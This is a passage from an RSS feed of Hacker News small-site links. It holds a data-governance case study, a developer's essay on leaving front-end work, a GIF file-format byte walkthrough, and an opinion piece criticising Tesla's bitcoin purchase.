<ul><li>The Marketing team recently established a new Social Media Influencer program, enabling influencers to sign up to earn referral commissions on books they recommend. </li><li>A very popular Social Media Influencer has recommended a particular book to their large follower base</li><li>The rapid increase in sales of the book have impacted the company’s recommendation model, leading to it being recommended to a much wider audience of customers</li><li>It turns out that the Social Media Influencer has misrepresented the book leading to a high rate of return from dissatisfied customers</li><li>In order to placate angry customers, customer Service follows its procedure of sending gifts to aggrieved customers, as recommended by their recommendation engine.</li><li>The gifts only inflame the situation, infuriated customers are often sent the same book as they initially returned.</li></ul>
<p>How could this all happen?</p>
<h2 id="Data-Governance">A failure of <span>Data Governance</span></h2>
<p>The <a href="https://datagovernance.com/">Data Governance Institute</a> defines data governance as “a system of decision rights and accountabilities for information-related processes, executed according to agreed-upon models which describe who can take what actions with what information, and when, under what circumstances, using what methods.”</p>
<p>Data governance is often formally practised in large organizations, but many of the concepts are applicable to all organisations seeking to utilise data in decision making.</p>
<p>In Forest Corp’s case, a series of failures in the way it collects, manages and utilizes data led to the cascading problems illustrated above.</p>
<h2 id="Data-Quality">Data Quality</h2>
<figure><img loading="lazy" width="1024" height="372" src="https://growingdata.com.au/wp-content/uploads/2021/02/DataQualitySkyscraper_Fig2-01-1024x372.png" alt="" srcset="https://growingdata.com.au/wp-content/uploads/2021/02/DataQualitySkyscraper_Fig2-01-1024x372.png 1024w, https://growingdata.com.au/wp-content/uploads/2021/02/DataQualitySkyscraper_Fig2-01-300x109.png 300w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Data Quality Foundations <a href="https://profisee.com/data-quality-what-why-how-who/" target="_blank" rel="noreferrer noopener">Image credit</a></figcaption></figure>
<p>Data quality is the foundation for all analytics and machine learning. As organisations seek to make more decisions on the basis of data, there is a real risk that decisions can be made incorrectly if the data underpinning them is incorrect, incomplete or inconsistent.</p>
<p>A key failure for Forest Corp’s marketing team was in its lack of screening of Influencer’s past histories. Social Media Influencers could sign up for their affiliate program easily, with critical pieces of information collected without any verification.</p>
<p>In the Forest Corp example, when the Marketing team’s analytics began showing the success of one affiliate code they immediately looked up the influencer behind it. Unfortunately, the URLs behind the profile were unusable. No data was supplied for their Twitter and Facebook handles, and their supplied Instagram handle didn’t actually exist. While contact information was provided, emails and phone calls went unanswered. So the Marketing Team was faced with a challenging scenario – their Social Media Influencer program is clearly generating sales but they are blind as to the content triggering it or the person behind it.</p>
<p>If data is captured incorrectly, it is often difficult or impossible to correct it. Worst of all though is that it’s only when an organisation <em>really</em> needs high-quality data that they realise it was never collected properly. In the Forrest Corp example, they were blind to a massive spike in sales attributable to a single affiliate without any way to tie it back to.</p>
<h3 id="Data-Quality-Recommendations">Data Quality Governance Recommendations</h3>
<h4 id="Incentivise-data-quality-at-the-point-of-collection">Incentivise data quality at the point of collection</h4>
<p>Digging deeper into the sign-up process for affiliates, it was discovered that the affiliate systems were built quickly following a mandate from the Executive Team to get the system up and running prior to a major holiday. Additionally, the Marketing Manager’s key KPI’s for the quarter were the number of onboarded affiliates, as well as the sales volume generated by affiliates. The problems with the affiliate signup process was a product of these incentives.</p>
<p>The time pressure to build the onboarding system meant that the initial design could not be implemented in its entirety. As Product Owner, the Marketing Manager had to prioritize which features would make the initial version, and which would be delayed to a future version. Automated verification of affiliates was seen as a large piece of work and thought to add friction to the signup process potentially hurting the Marketing Managers KPIs. It was therefore easy for the Marketing Manager to de-prioritise this feature of the onboarding system.</p>
<h5 id="Guiding-principles-for-incentivizing-data-quality">Guiding principles for incentivizing data quality</h5>
<ul><li>Key Performance Indicators that create disincentives for data quality should be avoided.</li><li>Analyse and understand the unintended consequences of performance metrics on data quality</li><li>Incorporate data quality metrics into KPI’s for Product Owners whos products involve data capture</li></ul>
<h4 id="Projects-that-involve-data-collection-require-oversight-and-guidance,-and-periodic-review">Projects that involve data collection require oversight and guidance, and periodic review</h4>
<p>Without a process of oversight in how data was captured, the Marketing Manager was free to make decisions that ultimately caused the misleading Influencer to speak fraudulently on behalf of their organisation. However, the Marketing Manager is rightly focussed on Marketing, not issues of Data Governance. An organisation can’t and shouldn’t expect all its managers to be Data Governance experts.</p>
<h5 id="Guiding-principles-for-data-quality-oversight">Guiding principles for data quality oversight</h5>
<ul><li>A Data Governance Council should provide advice on issues relating to how projects are implemented and the potential costs and risks of different implementations.</li><li>Data quality metrics should be established with any project that involves data capture</li><li>A Data Governance Council should periodically review or audit key systems to see how they are actually being used and assess the quality of the data they capture.</li></ul>
<h4 id="Understand-the-pressures-on-your-users-when-entering-data">Understand the pressures on your users when entering data</h4>
<p>Equally, in designing the affiliate sign-up form, the Marketing Team failed to understand the pressures on Social Media Influencers. One of these pressures is the need to sign up to a <em>lot</em> of affiliate programs, and the fact that time spent signing up to affiliate programs is time not spent building their brand and following. The Forrest Corp Affiliate Signup process, while failing to verify key information, also asked for a lot of information much of which seemed fairly unimportant to them getting paid. Therefore a lot of fields were left blank, even critical ones.</p>
<h5 id="Guiding-principles-for-designing-data-capture-systems">Guiding principles for designing data capture systems</h5>
<p>Data entry is often the least enjoyable aspect of a process., but is of critical importance. Systems that collect data need to be user friendly and easy to use. Here are a few principles:</p>
<ul><li>Make use of “pick lists” or “autocomplete” to make it easy to link data</li><li>Make it easy to identify existing entities to reduce the risk of creating duplicate entries</li><li>Avoid requiring too many fields, or …</li></ul></div></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://growingdata.com.au/pragmatic-data-governance-is-critical-for-advanced-analytics-machine-learning-automation/">https://growingdata.com.au/pragmatic-data-governance-is-critical-for-advanced-analytics-machine-learning-automation/</a></em></p>]]>
            </description>
            <link>https://growingdata.com.au/pragmatic-data-governance-is-critical-for-advanced-analytics-machine-learning-automation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26072506</guid>
            <pubDate>Tue, 09 Feb 2021 00:52:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Futures Tools by a Futurist]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26071917">thread link</a>) | @autoditype
<br/>
February 8, 2021 | https://amywebb.io/futures-tools | <a href="https://web.archive.org/web/*/https://amywebb.io/futures-tools">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1583870197246_20500"><div><h3><strong>The Future Today Institute’s Futures Forecasting Model</strong></h3><p>The forecasting method I have developed — one, of course, influenced by other futurists but different in analysis and scope — is a seven-step process that I have refined during the past 15 years as part of my work at the Future Today Institute. The first five steps framing the present and analyzing disruptive forces, while the last two steps result in scenarios, impact and strategic actions. My futures forecasting methodology relies on quantitative and qualitative data, and it alternates between flared and focused thinking. <a href="https://futuretodayinstitute.com/mu_uploads/2020/02/FTI-Funnel.pdf" target="_blank">Download a PDF here</a>.</p></div></div></div>]]>
            </description>
            <link>https://amywebb.io/futures-tools</link>
            <guid isPermaLink="false">hacker-news-small-sites-26071917</guid>
            <pubDate>Mon, 08 Feb 2021 23:41:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I don't want to do front-end anymore]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 52 (<a href="https://news.ycombinator.com/item?id=26071906">thread link</a>) | @askonomm
<br/>
February 8, 2021 | https://www.askonomm.com/blog/i-dont-want-to-do-frontend-anymore | <a href="https://web.archive.org/web/*/https://www.askonomm.com/blog/i-dont-want-to-do-frontend-anymore">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I started coding when I was 14, around 2007 or so. The very first thing I wrote was HTML, then CSS. I liked
making stupid little web pages containing youtube embeds and guest books (anyone remembers those?) full of
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/marquee">marquees</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/blink">blinks</a>
and gifs. Lots of gifs. The pages were very simple, but joyful to make and also to use. At the time I had no idea that
you could make any money with making web pages, I simply thought it was a silly hobby people could have.</p>
<p>Fast-forward 3 years I got my first few gigs as a web developer. By then I was pretty good at HTML and CSS already,
had dabbled enough with PHP to know my way around of most sticky problems I would find myself in and while I didn't
really know much of vanilla JavaScript, it was okay, because everyone used almost exclusively <a href="https://jquery.com/">jQuery</a> anyway. Yet still,
the websites were rather simple and joyful to make.</p>
<p>It was easy to get started, too - you just created the files and refreshed the page. HTML? PHP? JavaScript? Just create the
file and save it, then refresh the browser. Rinse and repeat until you are happy with the result. But then, almost
out of nowhere, something changed. At first, it came slowly and before it could even speed up, it was already here.
<strong>The complicated web was here</strong>.</p>
<p>Nowadays I make a living mainly with JavaScript and TypeScript using React.js as a front-end framework. That's right,
front-ends are so complex they now need frameworks to be able to manage their seemingly infinite component hierarchies.
JavaScript no longer is liked by the community, so the community created a poor man's version of a typed language which
duct-tapes around an <a href="https://whydoesitsuck.com/why-does-javascript-suck/">already poorly made language</a>. </p>
<p>Starting a new project? Make sure to write your project idea down because by the time you are finished setting up the vast
boilerplate you have probably forgotten it. Vast boilerplate? Oh yeah, you better set-up your project with <a href="https://www.typescriptlang.org/">TypeScript</a>,
<a href="https://eslint.org/">ESlint</a>, <a href="https://webpack.js.org/">Webpack</a> and <a href="https://babeljs.io/">Babel</a>, because
if you don't then obviously you haven't learned anything since 2005 and suck. Don't have <a href="https://www.npmjs.com/">NPM</a>? Better install that, too,
because nobody installs libraries without a package manager anymore. Oh and while you're at it, install also <a href="https://yarnpkg.com/">Yarn</a>,
because why not make use of two package managers at the same time. <em>Phew</em>, you did all that? Damn, that's commitment!
You can finally write what is essentially just HTML and JavaScript!</p>
<p>Now, don't forget we also want to style our project, but if you thought you could get away with writing good ol' CSS,
you were wrong. We no longer write CSS, because it's lame. We now write <a href="https://sass-lang.com/">SCSS</a> instead,
so that we could write dynamic stylesheets that convert to CSS, because <a href="https://hospodarets.com/you-might-not-need-a-css-preprocessor">of course 99% of the web needs that</a>. </p>
<p>But enough of the hating. If I wanted I could hate on anything most likely, and the web has come a long way since 2007,
in lots of good ways, and I don't want to discredit that. I suppose with the increase of complexity in what we want to
achieve on the web the stack to achieve it with has had to also increase in complexity. For me, personally, it's
too much. I want to have a personal life and not have to spend my nights reading up on some new flavour of *.js in
fear that if I don't I would soon be made irrelevant. I don't want to learn nor use a million different tools. I don't want
to know a bit about everything and a lot about nothing. </p>
<p>Thus, I don't want to do front-end development anymore. The joy is gone. I've given in my resignation at my current place of
employment and will be seeking an exclusively back-end role for my next adventure, starting April. The language doesn't
matter much to me, I know enough of them to know that they are all very similar and thus easy enough to learn. If you know of a
good opportunity, <a href="mailto:asko@askonomm.com">let me know</a>.</p></div></div>]]>
            </description>
            <link>https://www.askonomm.com/blog/i-dont-want-to-do-frontend-anymore</link>
            <guid isPermaLink="false">hacker-news-small-sites-26071906</guid>
            <pubDate>Mon, 08 Feb 2021 23:40:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's in a GIF – Bit by Byte]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26070873">thread link</a>) | @caminocorner
<br/>
February 8, 2021 | http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp | <a href="https://web.archive.org/web/*/http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>
	We sill start off by walking though the different parts of a GIF file.
	(The information on this page is primarily drawn from the
	<a href="http://www.w3.org/Graphics/GIF/spec-gif89a.txt">W3C GIF89a specification</a>.)
	A GIF file is made up of a bunch of different "blocks" of data. The following diagram
	shows all of the different types of blocks and where they belong in the file. The file starts
	at the left and works it's way right. At each branch you may go one way or the other. The
	large "middle" section can be repeated as many times as needed. (Technically, it may
	also be omitted completely but i can't imagine what good a GIF file with no image data
	would be.)
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/gif_file_stream.gif" alt="GIF file stream diagram" width="700" height="220"></p>
	<p>
	I'll show you what these blocks looks like by walking through a sample
	GIF file. You can see the sample file and its corresponding bytes below.
	</p>
	

	<p>
	Note that not all blocks are represented in this sample file. I will provide samples of missing
	blocks where appropriate.
	The different types of blocks include:
		<a href="#header_block">header</a>,
		<a href="#logical_screen_descriptor_block">logical screen descriptor</a>,
		<a href="#global_color_table_block">global color table</a>,
		<a href="#graphics_control_extension_block">graphics control extension</a>,
		<a href="#image_descriptor_block">image descriptor</a>,
		<a href="#local_color_table_block">local color table</a>,
		<a href="#image_data_block">image data</a>,
		<a href="#plain_text_extension_block">plain text extension</a>,
		<a href="#application_extension_block">application extension</a>,
		<a href="#comment_extension_block">comment extension</a>,
		and <a href="#trailer_block">trailer</a>.
	Let's get started with the first block!
	</p>

	<h2><a name="header_block">Header Block</a></h2>
	<p>From Sample File: </p>
	<p>
	All GIF files must start with a header block. The header takes up the first
	six bytes of the file. These bytes should all correspond to
	<a href="http://www.ascii.cl/">ASCII character codes</a>. We actually have two pieces
	of information here. The first three bytes are called the <strong>signature</strong>.
	These should always be "GIF" (ie 47="G", 49="I", 46="F"). The next three specify the
	<strong>version</strong> of the specification that was used to encode the image. We'll only be working
	with "89a" (ie 38="8", 39="9", 61="a"). The only other recognized version string
	is "87a" but i doubt most people will run into those anymore.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/header_block.gif" alt="GIF header block layout"></p>

	<h2><a name="logical_screen_descriptor_block">Logical Screen Descriptor</a></h2>
	<p>From Sample File: <span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 91 </span><span> 00 </span><span> 00 </span></p>
	<p>
	The logical screen descriptor always immediately follows the header. This block
	tells the decoder how much room this image will take up. It is exactly
	seven bytes long. It starts with the <strong>canvas width</strong>. This value
	can be found in the first two bytes. It's saved in a format called the spec
	simply calls <em>unsigned</em>. Basically we're looking at a 16-bit, nonnegative
	integer (0-65,535). As with all the other multi-byte values in the GIF format, the least
	significant byte is stored first (little-endian format). This means where we would read
	<span> 0A </span><span> 00 </span>
	from the byte stream, we would normally write it as <span>000A</span> which is
	the same as 10. Thus the width of our sample image is 10 pixels. As a further example
	255 would be stored as <span> FF </span><span> 00 </span> but 256 would be <span> 00 </span><span> 01 </span>.
	As you might expect, the <strong>canvas height</strong> follows. Again, in this sample we
	can see this value is <span> 0A </span><span> 00 </span> which is 10.
	</p>
	<p>
	Next we have a <em>packed byte</em>. That means that this byte actually has multiple values
	stored in its bits. In this case, the byte <span> 91 </span> can be represented
	as the binary number <span>10010001</span>. (The built in Windows calculator
	is actually very useful when converting numbers into hexadecimal and binary formats. Be sure
	it's in "scientific" or "programmer" mode, depending on the version of
	windows you have.) The first (most-significant) bit is the <strong>global color
	table flag</strong>. If it's 0, then there is none. If it's 1, then a global color table will
	follow. In our sample image, we can see that we will have a global color table (as will usually
	be the case).  The next three bits represent the <strong>color resolution</strong>. The spec
	says this value " is the number of bits per primary color available to the original image,
	minus 1" and "...represents the size of the entire palette from which the colors in the
	graphic were selected." Because i don't much about what this one does, I'll point you to
	a more knowledgeable article on <a href="http://www.devx.com/projectcool/Article/19997/0/page/7">bit and color depth</a>.
	For now 1 seems to work. Note that <span>001</span> represents 2 bits/pixel;
	<span>111</span> would represent 8 bits/pixel.
	The next single bit is the <strong>sort flag</strong>. If the values is 1, then the
	colors in the global color table are sorted in order of "decreasing importance," which
	typically means "decreasing frequency" in the image. This can help the image decoder but
	is not required. Our value has been left at 0. The last three bits are the <strong>
	size of global color table</strong>. Well, that's a lie; it's not the actual size of the
	table. If this value is N, then the actual table size is 2^(N+1). From our sample
	file, we get the three bits <span>001</span> which is the binary version of 1.
	Our actual table size would be 2^(1+1) = 2^2 = 4. (We've mentioned the global color table
	several times with this byte, we will be talking about what it is in the next section.)
	</p>
	<p>
	The next byte gives us the <strong>background color index</strong>. This byte is only meaningful
	if the global color table flag is 1. It represents which color in the global color table
	(by specifying its index) should be used for pixels whose value is not specified in the
	image data. If, by some chance, there is no global color table, this byte should be 0.
	</p>
	<p>
	The last byte of the logical screen descriptor is the <strong>pixel aspect ratio</strong>.
	I'm not exactly sure what this value does. Most of the images I've seen have this value
	set to 0. The spec says that if there was a value specified in this byte, N, the actual
	ratio used would be (N + 15) / 64 for all N&lt;&gt;0.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/logical_screen_desc_block.gif" alt="GIF logical screen descriptor block layout"></p>





	<h2><a name="global_color_table_block">Global Color Table</a></h2>
	<p>From Sample File: <span> FF </span><span> FF </span><span> FF </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	We've mentioned the <strong>global color table</strong> a few times already now lets talk
	about what it actually is. As you are probably already aware, each GIF has its own color
	palette. That is, it has a list of all the colors that can be in the image and cannot
	contain colors that are not in that list. The global color table is where that list
	of colors is stored. Each color is stored in three bytes. Each of the bytes represents
	an RGB color value. The first byte is the value for red (0-255), next green, then blue.
	The size of the global color table is determined by the value in the packed byte of the
	logical screen descriptor. As we mentioned before, if the value from that byte is N, then
	the actual number of colors stored is 2^(N+1). This means that the global color table will
	take up 3*2^(N+1) bytes in the stream.
	</p>

	<div>
	<table id="global_color_size">
	<tbody><tr><th>Size In Logical<br>Screen Desc</th><th>Number Of<br>Colors</th><th>Byte<br>Length</th></tr>
	<tr><td>0</td><td>2</td><td>6</td></tr>
	<tr><td>1</td><td>4</td><td>12</td></tr>
	<tr><td>2</td><td>8</td><td>24</td></tr>
	<tr><td>3</td><td>16</td><td>48</td></tr>
	<tr><td>4</td><td>32</td><td>96</td></tr>
	<tr><td>5</td><td>64</td><td>192</td></tr>
	<tr><td>6</td><td>128</td><td>384</td></tr>
	<tr><td>7</td><td>256</td><td>768</td></tr>
	</tbody></table>
	</div>

	<p>
	Or sample file has a global color table size of 1. This means it holds 2^(1+1)=2^2=4 colors.
	We can see that it takes up 12, (3*4), bytes as expected. We read the bytes three at a time to get
	each of the colors. The first color is #FFFFFF (white). This value is given an index of 0.
	The second color is #FF0000 (red). The color with an index value of 2 is #0000FF (blue).
	The last color is #000000 (black). The index numbers will be important when we decode
	the actual image data.
	</p>
	<p>
	Note that this block is labeled as "optional." Not every GIF has to specify a global
	color table. However, if the global color table flag is set to 1 in the logical
	screen descriptor block, the color table is then required to immediately follow that
	block.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/global_color_table.gif" alt="GIF global color table block layout"></p>



	<h2><a name="graphics_control_extension_block">Graphics Control Extension</a></h2>
	<p>From Sample File: <span> 21 </span><span> F9 </span><span> 04 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	Graphic control extension blocks are used frequently to
	specify transparency settings and control animations. They are completely optional.
	Since transparency and animations are bit complicated, I will hold off on many of
	the details of this block until a later section
	(see <a href="http://matthewflickinger.com/lab/whatsinagif/animation_and_transparency.asp">Transparency and Animation</a>).
	In the interest of this page being complete, I will at least tell you what
	the bytes represent.
	</p>
	<p>
	The first byte is the <strong>extension introducer</strong>. All <em>extension</em>
	blocks begin with <span>21</span>. Next is the <strong>graphic
	control label</strong>, <span>F9</span>, which is the value that
	says this is a graphic control extension. Third up is the total <strong>block
	size</strong> in bytes. Next is a packed field. Bits 1-3 are reserved for future
	use. Bits 4-6 indicate <strong>disposal method</strong>. The penult bit is
	the <strong>user input flag</strong> and the last is the <strong>transparent color
	flag</strong>. The <strong>delay time</strong> value follows in the next two bytes
	stored in the unsigned format. After that we have the <strong>transparent color
	index</strong> byte. Finally we have the <strong>block terminator</strong> which
	is always <span>00</span>.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/graphic_control_ext.gif" alt="GIF graphic control extension block layout"></p>




	<h2><a name="image_descriptor_block">Image Descriptor</a></h2>
	<p>From Sample File: <span> 2C </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 00 </span></p>
	<p>
	A single GIF file may contain multiple images (useful when creating animated
	images). Each image begins with an image descriptor block. This block is exactly
	10 bytes long.
	</p>
	<p>
	The first byte is the <strong>image separator</strong>. Every image
	descriptor begins with the value <span>2C</span>. The next 8 bytes
	represent the location and size of the following image. An image in
	the stream may not necessarily take up the entire canvas size defined by
	the logical screen descriptor. Therefore, the image descriptor specifies
	the <strong>image left position</strong> and <strong>image top position</strong> of
	where the image should begin on the canvas. Next it specifies the
	<strong>image width</strong> and <strong>image height</strong>. Each of these
	values is in the two-byte, unsigned format. Our sample image indicates that
	the image starts at (0,0) and is 10 pixels wide by 10 pixels tall. (This image
	does take up the whole canvas size.)
	</p>
	<p>
	The last byte is another packed field. In our sample file this byte is 0 so
	all of the sub-values will be zero. The first (most significant) bit in
	the byte is the <strong>local color table flag</strong>. Setting this flag
	to 1 allows you to specify that the image data that follows uses a different
	color table than the global color table. (More information on the local
	color table follows.) The second bit is the <strong>interlace flag</strong>.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/image_descriptor_block.gif" alt="GIF image descriptor block layout"></p>





	<h2><a name="local_color_table_block">Local Color Table</a></h2>
	<p>
	The local color table looks identical to the global color table. The local
	color table would always immediately follow an image descriptor but will only
	be there if the local color table flag is set to 1. It is effective only for the
	block of image data that immediately follows it. If no local color table
	is specified, the global color table is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp">http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp</a></em></p>]]>
            </description>
            <link>http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070873</guid>
            <pubDate>Mon, 08 Feb 2021 22:07:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla spent $1.5B in clean car credits on Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 143 (<a href="https://news.ycombinator.com/item?id=26070744">thread link</a>) | @ForHackernews
<br/>
February 8, 2021 | https://amycastor.com/2021/02/08/tesla-spent-1-5b-in-clean-car-credits-on-bitcoin-the-filthiest-asset-imaginable/ | <a href="https://web.archive.org/web/*/https://amycastor.com/2021/02/08/tesla-spent-1-5b-in-clean-car-credits-on-bitcoin-the-filthiest-asset-imaginable/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5855">
		<div>
		
<p>Tesla bought $1.5 billion worth of bitcoin, the company said in a <a rel="noreferrer noopener" href="https://secfilings.nasdaq.com/filingFrameset.asp?FilingID=14678414&amp;RcvdDate=2/8/2021&amp;CoName=TESLA,%20INC.&amp;FormType=10-K&amp;View=html" target="_blank">regulatory filing</a> on Monday, effectively putting nearly all of the money it earned on clean car credits towards the world’s filthiest asset. </p>



<p>Where to begin? Let’s start with the firm’s SEC filing. As of January 2021, the Silicon Valley-based company updated its investment policy to allow it more flexibility in diversifying its returns on cash. Those changes allow Tesla to buy bitcoin and other cryptocurrencies, which it immediately did.</p>



<p>“Thereafter, we invested an aggregate $1.50 billion in bitcoin under this policy and may acquire and hold digital assets from time to time or long-term. Moreover, we expect to begin accepting bitcoin as a form of payment for our products in the near future, subject to applicable laws and initially on a limited basis, which we may or may not liquidate upon receipt.”</p>



<p>The filing does not say how Tesla bought the bitcoin or how they are custodying it. It also does not tell us how many bitcoin it purchased or for what average price. We only know Tesla bought bitcoin sometime between Jan. 1 and early February, when the price was between $30,000 to $41,000.&nbsp;</p>



<p>Tesla says its customers will be able to buy its vehicles with bitcoin. However, “liquidate upon receipt” means that if you purchase a Tesla with bitcoins, the company is likely to sell those bitcoins for cash immediately, something that is usually done by sending the funds through a payment processor first. </p>



<p>This is what most large merchants do when they say they are accepting bitcoin. They convert it to cash, so they don’t have to deal with bitcoin’s wild volatility. So if you buy a Tesla with bitcoin in the future, it will likely be the same as selling your bitcoin for fiat and then handing the cash over to Tesla. </p>



<h2>Clean car credits for bitcoin</h2>



<p>Tesla earns tradable credits under various regulations related to zero-emission vehicles, greenhouse gas, fuel economy, renewable energy, and clean fuel. It then turns around and sells those credits to other automakers when they can’t comply with auto emissions and fuel economy standards.</p>



<p>In 2020, Tesla reported making $1.58 billion in selling these tradable credits it received. And here is the important bit: without those tradeable credits, the company would not have been profitable. <a href="https://apnews.com/article/coronavirus-pandemic-67705113fb4f895bd051a1bee1d23518" target="_blank" rel="noreferrer noopener">Tesla would have lost money.</a> So what does it do with that money? It turns around and buys bitcoin. </p>



<p>Bitcoin is an environmental disaster. The bitcoin network currently burns around 116.87 terawatt-hours per year, according to the <a href="https://cbeci.org/">University of Cambridge’s Centre for Alternative Finance.</a> To give you an idea of how devastating that is to our climate, that is as much energy as a small country or <a href="https://news.bitcoin.com/the-bitcoin-network-now-consumes-7-nuclear-plants-worth-of-power/#:~:text=The%20Cambridge%20Bitcoin%20Electricity%20Consumption%20Index%20(CBECI)%20shows%20the%20estimated,is%207.46%20gigawatts%20(GW).&amp;text=The%20amount%20of%20power%20consumed,photovoltaic%20(PV)%20solar%20panels." target="_blank" rel="noreferrer noopener">seven nuclear power plants. </a></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Bitcoin is such an environmental disaster it really is a crime against humanity.  So what does Tesla do with their $1.5B in revenue last year from clean car credits sold to other automakers?  Put it into “Destroy the Planet Inc”</p>— Nicholas Weaver (@ncweaver) <a href="https://twitter.com/ncweaver/status/1358780808144723968?ref_src=twsrc%5Etfw">February 8, 2021</a></blockquote></div>
</div></figure>



<p>Keep in mind, bitcoin’s energy consumption increases right alongside the price of bitcoin. As bitcoin goes up in price, more people want to mine the virtual currency for profit, leading to greater energy consumption as they pile more money into power-hungry ASIC rigs.</p>



<p>Bitcoin is not only filthy for its energy waste but also because it is the currency of choice in underground economies. <a href="https://www.forbes.com/sites/andreatinianow/2020/07/01/bitcoin-demand-drives-14-billion-ransomware-industry-in-the-us/?sh=40346fca32d8" target="_blank" rel="noreferrer noopener">Ransomware</a> would probably not exist if it were not for bitcoin. </p>



<p>And bitcoin fits the very definition of <a rel="noreferrer noopener" href="https://www.ic.unicamp.br/~stolfi/bitcoin/2020-12-31-bitcoin-ponzi.html" target="_blank">a Ponzi scheme.</a> It has no intrinsic value—any money new investors put into the system immediately goes out via bitcoin miners selling their 900 newly minted bitcoin per day. Tesla’s massive influx of cash will fund the bitcoin miners for about a month and a half, at most. </p>



<h2>Elon Musk shilling crypto</h2>



<p>Two years ago, Musk and Tesla paid a combined <a rel="noreferrer noopener" href="https://www.sec.gov/news/press-release/2018-226" target="_blank">$40 million penalty</a> to the SEC after Musk’s cryptic tweets about taking Tesla private led to stock fluctuations. The regulator <a href="https://www.sec.gov/litigation/complaints/2018/comp-pr2018-219.pdf">charged him</a> with securities fraud. As part of the settlement, Musk agreed to step down as chairman of the company, although he continued to hold the title of CEO. </p>



<p>Apparently, Musk has learned nothing from that experience. Last month, presumably around the time Tesla was buying up hoards of bitcoin unbeknownst to the general public, Musk caused the price of bitcoin to go up 20% when he <a rel="noreferrer noopener" href="https://www.cnbc.com/2021/01/29/bitcoin-spikes-20percent-after-elon-musk-adds-bitcoin-to-his-twitter-bio.html" target="_blank">changed his&nbsp;Twitter bio</a>&nbsp;to include the word “bitcoin.”</p>



<p>Soon after changing the bio, Musk said in a&nbsp;<a rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1355068728128516101" target="_blank">tweet:</a> “In retrospect, it was inevitable.” In retrospect, that tweet looks like an early hint that Tesla was funneling money into the digital asset.  </p>



<figure><div>

</div></figure>



<p>Will Musk get into trouble for his bitcoin tweets? </p>



<p>It is unlikely, Columbia University Law Professor John Coffee, Jr., told the <a href="https://www.wsj.com/articles/tesla-buys-1-5-billion-in-bitcoin-11612791688">Wall Street Journal</a>, especially given that a federal judge rebuked the SEC when it sought to hold Musk in contempt in 2019. “I don’t think the commission would dare push it that far,” he said. </p>



<p>The latest Tesla news caused bitcoin to spike 18% this morning, <a rel="noreferrer noopener" href="https://www.cnbc.com/2021/02/08/bitcoin-surges-above-43000-to-a-record-after-elon-musks-tesla-buys-1point5-billion.html" target="_blank">sending the price to over $44,000,</a> and setting a new all-time high. </p>



<p><em>Updates Feb. 8: Bitcoin topped $44,000 on Monday, even higher than the $43,000 I mentioned earlier. I added that in the SEC settlement Musk agreed to step down as chairman of Tesla. And I added the Coffee quote from WSJ.</em></p>



<p><em>If you like my work, please support my writing by subscribing to my&nbsp;<a rel="noreferrer noopener" href="https://www.patreon.com/amycastor" target="_blank">Patreon account</a>&nbsp;for as little as $5 a month.&nbsp; </em></p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://amycastor.com/2021/02/08/tesla-spent-1-5b-in-clean-car-credits-on-bitcoin-the-filthiest-asset-imaginable/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070744</guid>
            <pubDate>Mon, 08 Feb 2021 21:57:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn Go with Tests]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26070606">thread link</a>) | @noch
<br/>
February 8, 2021 | https://quii.gitbook.io/learn-go-with-tests/ | <a href="https://web.archive.org/web/*/https://quii.gitbook.io/learn-go-with-tests/">archive.org</a>
